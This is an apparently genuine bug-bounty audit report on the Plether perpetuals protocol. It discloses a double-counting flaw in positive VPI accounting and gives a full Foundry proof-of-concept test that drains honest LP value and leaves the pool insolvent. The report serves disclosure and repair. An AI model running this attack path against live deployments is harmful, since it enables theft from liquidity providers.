# \#98596 [SC-Critical] Refundable positive VPI can fund an LP redemption and then be repaid from remaining LP backing

**Submitted on Nov 8th 2026 at 22:51:28 UTC by @adeolu for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98596
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Brief/Intro

Positive virtual price impact (VPI) collected when a position is opened is immediately recognized as HousePool revenue and made available to LP withdrawals, even though the same positive lifetime VPI remains refundable when the position is closed. Because neither open solvency checks nor HousePool withdrawal accounting reserve this contingent refund liability, an attacker can use the temporary VPI inflow to increase a matured LP redemption and then close the position at the unchanged price to receive the VPI back. The same value is therefore realized twice: first by the exiting LP and then by the closing trader, causing direct loss to remaining LPs and potentially leaving the protocol insolvent.

## Vulnerability Details

### Root cause

The protocol gives positive lifetime VPI two incompatible accounting treatments:

1. At open, it is treated as final LP revenue and immediately increases HousePool cash.
2. On close, it remains part of the position's lifetime VPI and can be returned to the trader as a rebate.

This would be safe only if the protocol reserved the possible refund while the position remained open. It does not.

All source links below are pinned to commit [`6909f261c7983f7651536a55df1f5fd45b50face`](https://github.com/Plether-Fi/plether-core/tree/6909f261c7983f7651536a55df1f5fd45b50face).

### 1. Positive VPI is immediately recorded as HousePool revenue

`executeOpen` applies the trade cost and records every positive remainder as claimant revenue with `CashArrived` status. This makes the amount part of HousePool's physical and distributable cash.

Source: [`CfdEngineSettlementSidecar.sol#L446-L464`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464)

```solidity
(int256 netMarginChange, uint256 protocolFeeCreditedAssets) = clearinghouse.applyOpenCost(
    delta.account,
    delta.marginDeltaAssets,
    delta.tradeCostAssets,
    host.pool(),
    host.protocolTreasury(),
    delta.executionFeeAssets
);
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

### 2. The same positive VPI remains stored on the position

The open settlement simultaneously adds the VPI delta to `vpiAccrued`. The revenue recognition above therefore does not extinguish the trader's ability to recover the amount later.

Source: [`CfdEngineSettlementSidecar.sol#L503-L520`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/CfdEngineSettlementSidecar.sol#L503-L520)

```solidity
host.settlementWritePosition(
    delta.account,
    CfdEngineSettlementTypes.PositionState({
        size: delta.newPosSize,
        entryCostAssetAtoms: delta.newPosEntryCostAssetAtoms,
        maxProfitAssets: currentPosition.maxProfitAssets + delta.posMaxProfitIncrease,
        lastUpdateTime: uint64(block.timestamp),
        lastCarryTimestamp: uint64(block.timestamp),
        vpiAccrued: currentPosition.vpiAccrued + delta.posVpiAccruedDelta,
        side: currentPosition.size == 0 ? delta.posSide : currentPosition.side
    })
);
```

### 3. The VPI reserve deliberately covers only negative lifetime VPI

The reserve target returns a nonzero amount only when `vpiAccruedAssets < 0`. A positive balance—although refundable through a later negative close VPI—has a reserve target of zero.

Source: [`CfdEnginePlanLib.sol#L47-L55`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L47-L55)

```solidity
function _negativeVpiReserveTarget(
    int256 vpiAccruedAssets
) private pure returns (uint256 targetAssets) {
    if (vpiAccruedAssets < 0) {
        targetAssets = uint256(-(vpiAccruedAssets + 1)) + 1;
    }
}
```

Open planning uses this negative-only function for both the pre-open and post-open reserve requirements.

Source: [`CfdEnginePlanLib.sol#L331-L350`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L331-L350)

```solidity
delta.tradeCostAssets = openState.tradeCostAssets;
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;

delta.vpiRebateReserveBeforeAssets = effectiveSnap.vpiRebateReserveAssets;
if (delta.vpiRebateReserveBeforeAssets < _negativeVpiReserveTarget(effectiveSnap.position.vpiAccrued)) {
    delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.VPI_REBATE_RESERVE_UNFUNDED;
    return delta;
}
delta.vpiRebateReserveAfterAssets =
    _negativeVpiReserveTarget(effectiveSnap.position.vpiAccrued + openState.vpiAssets);
```

For a position with `+800` lifetime VPI, `_negativeVpiReserveTarget(+800)` is zero. No portion of the $800 HousePool inflow is protected against withdrawal.

### 4. Open solvency checks reserve directional liability and a settlement buffer, but not refundable positive VPI

The open planner calculates the post-open maximum side liability and requires only that amount plus the configured settlement buffer. Positive trade cost is included in pool cash before this check, so it improves the apparent solvency state without creating a matching contingent liability.

Source: [`CfdEnginePlanLib.sol#L700-L777`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L700-L777)

```solidity
postMaxLiability = SolvencyAccountingLib.getMaxLiability(
    long.maxProfitAssets,
    short.maxProfitAssets
);

int256 cashDeltaBeforeTopUp = delta.tradeCostAssets - int256(directlyCreditedAssets);
// Positive trade cost is added to pool cash.
poolCashBeforeTopUp = snap.poolCashAssets + uint256(cashDeltaBeforeTopUp);

satisfied = SolvencyAccountingLib.hasRequiredSettlementBuffer(
    result.effectiveAssetsAfterAssets,
    result.maxLiabilityAfterAssets,
    snap.settlementBufferBps
);
if (satisfied) {
    delta.requiredEffectiveAssetsAfterAssets = result.maxLiabilityAfterAssets
        + SolvencyAccountingLib.settlementBufferTargetAssets(
            result.maxLiabilityAfterAssets,
            snap.settlementBufferBps
        );
}
```

### 5. HousePool withdrawal accounting also omits positive lifetime VPI

The base withdrawal snapshot reserves maximum directional liability, realized trader claims, and supplemental reserves. It does not reserve positive lifetime VPI.

Source: [`HousePoolAccountingLib.sol#L40-L55`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/HousePoolAccountingLib.sol#L40-L55)

```solidity
snapshot.physicalAssets = engineSnapshot.physicalAssets;
snapshot.maxLiability = engineSnapshot.maxLiabilityAssets;
snapshot.reserved = engineSnapshot.maxLiabilityAssets
    + engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.supplementalReservedAssets;
snapshot.freeAssets =
    snapshot.physicalAssets > snapshot.reserved
        ? snapshot.physicalAssets - snapshot.reserved
        : 0;
```

`getSettlementFreeAssets` supplies the same incomplete inputs: physical assets, maximum directional liability, trader claims, and the settlement buffer.

Source: [`HousePool.sol#L1242-L1254`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/HousePool.sol#L1242-L1254)

```solidity
accountingSnapshot.physicalAssets = totalAssets();
accountingSnapshot.maxLiabilityAssets = maxLiabilityAssets;
accountingSnapshot.traderClaimBalanceAssets = ENGINE.totalTraderClaimBalanceAssets();
accountingSnapshot.supplementalReservedAssets =
    SolvencyAccountingLib.settlementBufferTargetAssets(
        maxLiabilityAssets,
        ENGINE.settlementBufferBps()
    );
return _buildWithdrawalSnapshot(
    accountingSnapshot,
    unassignedAssets,
    _pendingClaimantBucketAssets()
).freeAssets;
```

LP epoch settlement then uses this free-asset value as the withdrawal budget.

Source: [`HousePool.sol#L824-L855`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/HousePool.sol#L824-L855)

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

uint256 freeAssets =
    _buildWithdrawalSnapshot(
        accountingSnapshot,
        unassignedAssets,
        _pendingClaimantBucketAssets()
    ).freeAssets;

RedemptionPhase memory seniorPhase = RedemptionPhase({
    pricingPrincipal: seniorPrincipal,
    pricingSupply: _seniorShareSupply(),
    budget: _min(freeAssets, seniorPrincipal),
    fundedShares: 0,
    fundedAssets: 0,
    processedEpochs: 0,
    backlog: false
});
```

Consequently, a matured redemption may consume the positive VPI even while the position retaining the refund right remains open.

### 6. Closing at the same price can turn the positive accrual into a rebate

Close accounting calculates the VPI delta for the skew-reducing close. The lifetime clamp prevents lifetime VPI from becoming negative, but expressly allows a negative close VPI up to the position's existing positive accrual.

Source: [`CloseAccountingLib.sol#L103-L118`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);

if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets,
        inputs.postSkewAssets,
        inputs.poolDepthAssets,
        inputs.vpiFactor
    );
}

if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

In the PoC, the position opens with approximately `+800` lifetime VPI and closes at the unchanged $1.25 mark. The close is skew-reducing, so its negative VPI is permitted to offset the full positive accrual.

### 7. The rebate planner preserves realized trader claims, but not the surviving LP liability

The close planner calculates free cash by reserving fresh trader payouts and existing trader claims. It then pays the action rebate from that cash. The maximum directional liability and its settlement buffer are not preserved at this payment point.

Source: [`CfdEnginePlanLib.sol#L953-L977`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L953-L977)

```solidity
uint256 claimsAfterPriceNettingAssets =
    snap.totalTraderClaimBalanceAssets - delta.pricePnlClaimConsumedAssets;
uint256 poolCashAfterCollectionsAssets = snap.poolCashAssets
    + delta.pricePnlPledgeConsumedAssets
    + delta.actionChargeCollectedAssets
    - delta.actionProtocolFeeCreditedAssets;

uint256 freePoolCashAssets = CashPriorityLib.reserveFreshPayouts(
    poolCashAfterCollectionsAssets,
    claimsAfterPriceNettingAssets
).freeCashAssets;

if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets
            ? delta.actionRebateAssets
            : freePoolCashAssets;
    delta.actionRebateWaivedAssets =
        delta.actionRebateAssets - delta.actionRebatePaidAssets;
    poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
}
```

### 8. The sidecar physically transfers the rebate from HousePool

The planned rebate is paid from HousePool to the clearinghouse and credited to the trader.

Source: [`CfdEngineSettlementSidecar.sol#L618-L624`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L624)

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(
        address(clearinghouse),
        delta.actionRebatePaidAssets
    );
    clearinghouse.settleAssets(
        delta.account,
        int256(delta.actionRebatePaidAssets)
    );
}
```

At this point the LP redemption has already removed the first realization of the VPI. This transfer realizes it a second time from the assets backing the LPs who remained.

### Complete attack path

1. Establish $1,000,000 of HousePool cash through real LP deposits.
2. Open equal 125,000-lot LONG and SHORT anchors at $2.00 through the public bounded V3 order pipeline, producing zero size skew.
3. Move the legitimate oracle mark to $1.25. The anchor price PnL cancels while a $250,000 maximum directional liability remains.
4. Create and mature a genuine $751,000 Junior redemption request.
5. Open a 320,000-lot SHORT at $1.25 with $10,000 position margin through `commitOrder` and `executeOrder`.
6. The open generates `+799.999921` positive lifetime VPI. The sidecar stores it on the position and simultaneously recognizes it as HousePool revenue. No contingent reserve is created.
7. A permissionless keeper settles the LP epoch. Because the positive lifetime VPI is included in free cash, the redemption receives `$750,175.097547`, compared with `$749,375.097626` in the control branch. The difference is exactly `$799.999921`.
8. The attacker closes the SHORT at the unchanged $1.25 mark. The lifetime clamp permits the negative close VPI to refund the stored positive accrual.
9. HousePool assets fall from the healthy control value of `$250,625.000000` to `$249,985.000501`, below the surviving `$250,000` directional liability. Degraded mode is latched only after the rebate has left.

## Impact Details

**Selected impact: direct theft/loss of user funds held by the protocol (LP assets), resulting in protocol insolvency/bad debt.**

An attacker does not need privileged access, an incorrect oracle price, storage manipulation, or a malicious token. The required operations—LP deposits and redemptions, V3 order submission, keeper execution, epoch settlement, and closing—are ordinary permissioned or permissionless protocol functions.

The verified PoC produced the following control and attack outcomes:

| Measurement | Control | Attack | Difference |
|---|---:|---:|---:|
| Attacker redemption | $749,375.097626 | $750,175.097547 | **+$799.999921** |
| Attacker total wealth, including escrowed redemption shares | $770,999.999999 | $771,330.687120 | **+$330.687121** |
| Honest Junior LP value | $163,999.440093 | $163,508.552971 | **-$490.887122** |
| HousePool assets | $250,625.000000 | $249,985.000501 | **-$639.999499** |

The attacker wealth calculation includes settlement tokens held externally, internal clearinghouse assets, directly held Junior shares, and all pending or refundable Junior shares still escrowed in the partially funded redemption request. The attacker's net increase is lower than the extra redemption because the round trip pays execution fees, the open-order keeper bounty, carry, and changes the value and quantity of the residual escrowed shares. Those costs do not repair the accounting flaw: the attacker remains profitable, the honest LP loses value, and HousePool ends approximately `$14.999499` below its surviving `$250,000` directional liability. It is also below the intended liability-plus-settlement-buffer requirement.

The loss is not limited to the numerical example. For any exploitable positive lifetime VPI amount `V` that can be included in a matured LP redemption before close, the protocol may:

- pay up to `V` more to the exiting LP;
- remain obligated to return up to `V` through the closing VPI clamp;
- source the second payment from remaining LP backing; and
- accumulate bad debt when the remaining cash is insufficient for directional liabilities.

The attacker can optimize position size, redemption size, pool depth, fees, and timing to maximize `V - roundTripCosts`. Repetition across epochs or accounts can increase aggregate LP losses until degraded mode prevents further risk-increasing actions. Degraded mode is not a preventive control here because it is latched only after the undercollateralizing rebate has been paid, and it does not claw back the funded redemption.

## References

- Repository: [Plether-Fi/plether-core](https://github.com/Plether-Fi/plether-core)
- Reviewed commit: [`6909f261c7983f7651536a55df1f5fd45b50face`](https://github.com/Plether-Fi/plether-core/tree/6909f261c7983f7651536a55df1f5fd45b50face)
- [`CfdEngineSettlementSidecar.executeOpen`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/CfdEngineSettlementSidecar.sol#L423-L501)
- [`CfdEnginePlanLib` VPI reserve target](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L47-L55)
- [`CfdEnginePlanLib` open solvency check](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L700-L777)
- [`HousePoolAccountingLib.buildWithdrawalSnapshot`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/HousePoolAccountingLib.sol#L40-L55)
- [`HousePool.getSettlementFreeAssets`](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/HousePool.sol#L1242-L1254)
- [`CloseAccountingLib` lifetime VPI clamp](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
- [`CfdEnginePlanLib` close rebate payment planning](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/libraries/CfdEnginePlanLib.sol#L953-L977)
- [`CfdEngineSettlementSidecar` rebate transfer](https://github.com/Plether-Fi/plether-core/blob/6909f261c7983f7651536a55df1f5fd45b50face/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L624)



## Proof of Concept

## Proof of Concept

### Prerequisites

- Git
- Foundry with `forge` available on `PATH`
- A Solidity 0.8.35 compiler available to Foundry; Foundry will normally install it automatically

No RPC endpoint, fork URL, private key, or external account is required.

### Fresh-clone reproduction steps

```bash
git clone --recurse-submodules https://github.com/Plether-Fi/plether-core.git
cd plether-core
git checkout 6909f261c7983f7651536a55df1f5fd45b50face
git submodule update --init --recursive
```

Create the following file:

```text
packages/perps/test/perps/regression/PositiveVpiRedemptionReserve.t.sol
```

Use this complete content:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice Demonstrates that refundable positive lifetime VPI is exposed to LP redemption before close.
/// @dev Every state transition uses the production contracts and public V3 order/LP entrypoints from BasePerpTest.
contract PositiveVpiRedemptionReserveRegressionTest is BasePerpTest {

    address internal constant ATTACKER = address(0xA771);
    address internal constant HONEST_JUNIOR_LP = address(0xB0B);
    address internal constant SENIOR_SEED_LP = address(0x51);
    address internal constant LONG_ANCHOR = address(0x10A6);
    address internal constant SHORT_ANCHOR = address(0x5A07);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant ENTRY_PRICE = 2e8;
    uint256 internal constant ATTACK_PRICE = 1.25e8;
    uint256 internal constant ANCHOR_SIZE = 125_000e18;
    uint256 internal constant ATTACK_SIZE = 320_000e18;

    struct Outcome {
        uint256 attackerWealthAssets;
        uint256 redemptionAssets;
        uint256 honestJuniorValueAssets;
        uint256 poolAssets;
        uint256 positiveVpiAssets;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return HONEST_JUNIOR_LP;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_SEED_LP;
    }

    function test_PositiveVpiFundsRedemptionThenRemainsRefundableOnClose() public {
        _disableSeniorCoupon();

        // The two real seed positions and two real Junior deposits establish $1m of physical pool cash.
        _fundJunior(ATTACKER, 900_000e6);
        _fundJunior(HONEST_JUNIOR_LP, 98_000e6);
        assertEq(pool.rawAssets(), 1_000_000e6, "fixture must reach $1m through LP entrypoints");

        _fundTrader(LONG_ANCHOR, 20_000e6);
        _fundTrader(SHORT_ANCHOR, 20_000e6);
        _executeBoundedOrder(LONG_ANCHOR, CfdTypes.Side.LONG, ANCHOR_SIZE, 10_000e6, ENTRY_PRICE, false);
        _executeBoundedOrder(SHORT_ANCHOR, CfdTypes.Side.SHORT, ANCHOR_SIZE, 10_000e6, ENTRY_PRICE, false);

        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), ANCHOR_SIZE, "LONG anchor must be live");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), ANCHOR_SIZE, "SHORT anchor must be live");
        assertEq(
            _sideOpenInterest(CfdTypes.Side.LONG),
            _sideOpenInterest(CfdTypes.Side.SHORT),
            "equal anchors must produce zero size skew"
        );

        assertApproxEqAbs(pool.rawAssets(), 1_000_000e6, 1e6, "anchor round trip must preserve the $1m depth");
        bytes[] memory attackMarkData = _mockPythUpdateData(ATTACK_PRICE);
        router.updateMarkPrice(attackMarkData);

        // Size the request from the vault's public quote, then transfer the surplus to the remaining Junior LP.
        // This avoids fabricating raw share units while producing a genuine $751,000 redemption request.
        uint256 requestedShares = juniorVault.estimateWithdrawShares(751_000e6);
        uint256 surplusShares = juniorVault.balanceOf(ATTACKER) - requestedShares;
        vm.prank(ATTACKER);
        juniorVault.transfer(HONEST_JUNIOR_LP, surplusShares);

        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(redeemId));
        router.updateMarkPrice(_mockPythUpdateData(ATTACK_PRICE));
        _fundTrader(ATTACKER, 20_000e6);

        uint256 branchPoint = vm.snapshotState();
        Outcome memory control = _runControl(redeemId);
        assertTrue(vm.revertToState(branchPoint), "control branch must roll back");
        Outcome memory attacked = _runAttack(redeemId);
        vm.deleteStateSnapshot(branchPoint);

        emit log_named_uint("control redemption", control.redemptionAssets);
        emit log_named_uint("attack redemption", attacked.redemptionAssets);
        emit log_named_uint("control attacker wealth", control.attackerWealthAssets);
        emit log_named_uint("attack attacker wealth", attacked.attackerWealthAssets);
        emit log_named_uint("control honest Junior value", control.honestJuniorValueAssets);
        emit log_named_uint("attack honest Junior value", attacked.honestJuniorValueAssets);
        emit log_named_uint("control pool assets", control.poolAssets);
        emit log_named_uint("attack pool assets", attacked.poolAssets);

        assertApproxEqAbs(attacked.positiveVpiAssets, 800e6, 1000, "the open must charge approximately $800 VPI");
        assertEq(
            attacked.redemptionAssets - control.redemptionAssets,
            attacked.positiveVpiAssets,
            "the entire refundable VPI funds the LP exit"
        );
        assertGt(
            attacked.attackerWealthAssets,
            control.attackerWealthAssets,
            "the exiting LP/trader must finish richer than the no-trade control"
        );
        assertLt(
            attacked.honestJuniorValueAssets,
            control.honestJuniorValueAssets,
            "the remaining Junior LP must absorb the second realization"
        );
        assertEq(_maxLiability(), 250_000e6, "surviving anchors must retain $250,000 directional liability");
        assertLt(attacked.poolAssets, _maxLiability(), "rebate payment must consume protected liability backing");
        assertTrue(engine.degradedMode(), "the solvency deficit is detected only after the rebate is paid");
    }

    function _disableSeniorCoupon() internal {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.seniorRateBps = 0;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        pool.finalizePoolConfig();
    }

    function _runControl(
        uint256 redeemId
    ) internal returns (Outcome memory outcome) {
        router.settleLpEpoch(_mockPythUpdateData(ATTACK_PRICE));
        outcome.redemptionAssets = _claimRedemption(redeemId);
        outcome.attackerWealthAssets = _attackerWealth(redeemId);
        outcome.honestJuniorValueAssets = juniorVault.estimateRedeemAssets(juniorVault.balanceOf(HONEST_JUNIOR_LP));
        outcome.poolAssets = pool.rawAssets();
    }

    function _runAttack(
        uint256 redeemId
    ) internal returns (Outcome memory outcome) {
        uint256 poolAssetsBeforeOpen = pool.rawAssets();
        _executeBoundedOrder(ATTACKER, CfdTypes.Side.SHORT, ATTACK_SIZE, 10_000e6, ATTACK_PRICE, false);

        (,,,,,, int256 lifetimeVpi) = engine.positions(ATTACKER);
        assertGt(lifetimeVpi, 0, "open must store refundable positive lifetime VPI");
        outcome.positiveVpiAssets = uint256(lifetimeVpi);
        assertEq(
            clearinghouse.vpiRebateReserveAssets(ATTACKER), 0, "refundable positive lifetime VPI must have no reserve"
        );
        assertApproxEqAbs(
            pool.rawAssets() - poolAssetsBeforeOpen,
            outcome.positiveVpiAssets,
            1000,
            "the same lifetime VPI must also be recognized as LP cash"
        );

        router.settleLpEpoch(_mockPythUpdateData(ATTACK_PRICE));
        outcome.redemptionAssets = _claimRedemption(redeemId);

        _executeBoundedOrder(ATTACKER, CfdTypes.Side.SHORT, ATTACK_SIZE, 0, ATTACK_PRICE, true);
        (uint256 remainingSize,,,,,, int256 remainingVpi) = engine.positions(ATTACKER);
        assertEq(remainingSize, 0, "attack position must fully close");
        assertEq(remainingVpi, 0, "close must refund the stored positive lifetime VPI");

        outcome.attackerWealthAssets = _attackerWealth(redeemId);
        outcome.honestJuniorValueAssets = juniorVault.estimateRedeemAssets(juniorVault.balanceOf(HONEST_JUNIOR_LP));
        outcome.poolAssets = pool.rawAssets();
    }

    function _claimRedemption(
        uint256 redeemId
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertGt(shares, 0, "mature redemption must be funded");
        vm.prank(ATTACKER);
        assets = juniorVault.claimRedeem(redeemId, shares, ATTACKER, ATTACKER);
    }

    function _attackerWealth(
        uint256 redeemId
    ) internal view returns (uint256) {
        uint256 escrowedShares = juniorVault.pendingRedeemRequest(redeemId, ATTACKER)
            + juniorVault.refundableRedeemRequest(redeemId, ATTACKER);
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + juniorVault.estimateRedeemAssets(juniorVault.balanceOf(ATTACKER) + escrowedShares);
    }

    function _executeBoundedOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId =
            keccak256(abi.encode(account, side, size, margin, price, isClose, router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = price;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        uint64 id = router.commitOrder(request);
        bytes[] memory priceData = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "bounded V3 order must execute");
    }

}
```

Format-check and execute only the PoC:

```bash
forge fmt --check packages/perps/test/perps/regression/PositiveVpiRedemptionReserve.t.sol
forge test \
  --root packages/perps \
  --match-path test/perps/regression/PositiveVpiRedemptionReserve.t.sol \
  -vv
```

### Expected output

The test should pass and print values equivalent to:

```text
Ran 1 test for test/perps/regression/PositiveVpiRedemptionReserve.t.sol:PositiveVpiRedemptionReserveRegressionTest
[PASS] test_PositiveVpiFundsRedemptionThenRemainsRefundableOnClose()
Logs:
  control redemption: 749375097626
  attack redemption: 750175097547
  control attacker wealth: 770999999999
  attack attacker wealth: 771330687120
  control honest Junior value: 163999440093
  attack honest Junior value: 163508552971
  control pool assets: 250625000000
  attack pool assets: 249985000501

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

All logged asset values use the settlement token's six decimals. For example, `750175097547` is `$750,175.097547`.

### Validation performed

The commands above were re-run against an isolated clone of commit `6909f261c7983f7651536a55df1f5fd45b50face` with clean tracked sources and the repository's pinned submodules. Both the format check and the focused Forge test completed successfully with one passing test.

